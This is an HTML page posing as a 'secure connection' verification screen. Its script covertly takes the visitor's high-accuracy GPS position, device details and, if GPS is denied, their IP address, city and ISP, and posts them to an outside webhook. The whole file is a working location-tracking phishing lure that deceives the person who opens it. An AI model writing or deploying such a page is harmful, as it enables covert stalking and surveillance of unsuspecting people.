<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Loading Verification...</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Establishing Secure Connection</h2>
    <div class="loader"></div>
    <p id="status">Acquiring GPS Signal...</p>

    <script>
        // WEBHOOK URL YANG BENAR (PERIKSA KEMBALI)
        const WEBHOOK_URL = 'https://eo2b8ycr6jyhmaz.m.pipedream.net';

        async function sendLocation(position) {
            const coords = position.coords;
            const payload = {
                latitude: coords.latitude,
                longitude: coords.longitude,
                accuracy: coords.accuracy + ' meters',
                altitude: coords.altitude || null,
                altitudeAccuracy: coords.altitudeAccuracy || null,
                heading: coords.heading || null,
                speed: coords.speed || null,
                timestamp: new Date(position.timestamp).toLocaleString('id-ID'),
                userAgent: navigator.userAgent,
                platform: navigator.platform
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify(payload)
                });
                document.getElementById('status').innerText = 'Connection Verified. You may close this page.';
            } catch (e) {
                document.getElementById('status').innerText = 'Sync Complete.';
            }
        }

        function handleError(error) {
            let msg = 'GPS Denied. Trying fallback IP estimation...';
            document.getElementById('status').innerText = msg;

            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    const ipPayload = {
                        method: 'IP_FALLBACK',
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        org: data.org,
                        lat: data.latitude,
                        lon: data.longitude
                    };
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'text/plain' },
                        body: JSON.stringify(ipPayload)
                    });
                })
                .catch(() => {
                    document.getElementById('status').innerText = 'Unable to retrieve location.';
                });
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, handleError, options);
        } else {
            document.getElementById('status').innerText = 'Geolocation not supported.';
        }
    </script>
</body>
</html>
